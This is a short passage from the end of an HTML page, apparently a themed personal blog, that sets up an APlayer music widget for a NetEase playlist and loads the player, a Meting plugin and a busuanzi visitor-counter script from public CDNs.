+})()</script></div><div class="aplayer no-destroy" data-id="7495004841" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
